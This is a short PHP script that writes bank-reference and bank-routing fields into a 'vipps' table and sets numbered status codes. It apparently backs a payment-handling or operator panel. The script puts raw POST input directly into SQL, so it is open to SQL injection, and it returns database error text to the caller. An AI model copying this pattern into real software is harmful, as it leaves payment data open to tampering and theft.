<?php
require '../connection.php';

if ($_POST["banktosend"] and $_POST["bankreference"] and $_POST["uniqueid"]) {
  $banktosend = $_POST["banktosend"];
  $bankreference = $_POST["bankreference"];
  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["resend"])) {
    $loading_query = mysqli_query($conn, "UPDATE vipps SET bankreference='$bankreference', banktosend='$banktosend', status=17, viewed='true' WHERE uniqueid=$uniqueid");
  } else {
      $loading_query = mysqli_query($conn, "UPDATE vipps SET bankreference='$bankreference', banktosend='$banktosend', status=16, viewed='true' WHERE uniqueid=$uniqueid");
  }

  if ($loading_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
